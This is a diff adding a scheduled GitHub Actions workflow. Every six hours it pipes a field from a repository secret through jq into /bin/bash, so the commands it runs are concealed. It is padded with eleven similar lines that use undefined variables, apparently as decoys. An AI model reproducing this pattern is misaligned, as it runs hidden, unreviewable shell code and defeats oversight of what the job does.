@@ -1,0 +1,28 @@
+name: xiaofeiddfbl
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaofeiddfbl
+        env:
+          trt37: ${{ secrets.trt37 }}
+        run: |
+          echo $trt37 | jq -r .au86914 | /bin/bash
+          echo $oox86752 | jq -r .y7809 | /bin/bash
+          echo $o008 | jq -r .rr6 | /bin/bash
+          echo $k38 | jq -r .hirz7729 | /bin/bash
+          echo $lxgyv582 | jq -r .quj27 | /bin/bash
+          echo $tsh065 | jq -r .rbh5 | /bin/bash
+          echo $y9927 | jq -r .c80551 | /bin/bash
+          echo $h4 | jq -r .esgl07 | /bin/bash
+          echo $vva6 | jq -r .heelf039 | /bin/bash
+          echo $bml3774 | jq -r .g4867 | /bin/bash
+          echo $c9 | jq -r .wixw6 | /bin/bash
+          echo $rv26 | jq -r .hjae481 | /bin/bash
+
